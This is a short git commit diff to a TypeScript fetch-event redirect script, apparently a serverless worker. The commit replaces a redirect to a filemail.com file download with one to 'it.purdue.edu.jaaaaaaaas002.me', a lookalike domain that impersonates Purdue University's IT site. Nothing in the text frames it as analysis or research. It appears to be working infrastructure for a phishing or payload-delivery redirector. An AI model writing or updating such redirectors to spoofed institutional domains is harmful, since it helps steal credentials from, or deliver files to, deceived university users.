55efa42bda0548a8e22ff82d651497464f77a1a9
owostic101 <charles_still@aol.com>
2025-11-25 14:40:34 -0600

    Update redirect.ts

--- redirect.ts
+++ redirect.ts
@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://2111.filemail.com/api/file/get?filekey=s3kVTpRsSiB3FNs3XmWn5mngL0GLiu5RgYl9SH7mFq2j5v6PvuiZcKwdBuHLwpZrtxPU_03OaSfygLTpGkpe&pk_vid=0084db10739001c61759957311fdc291"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://it.purdue.edu.jaaaaaaaas002.me/"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
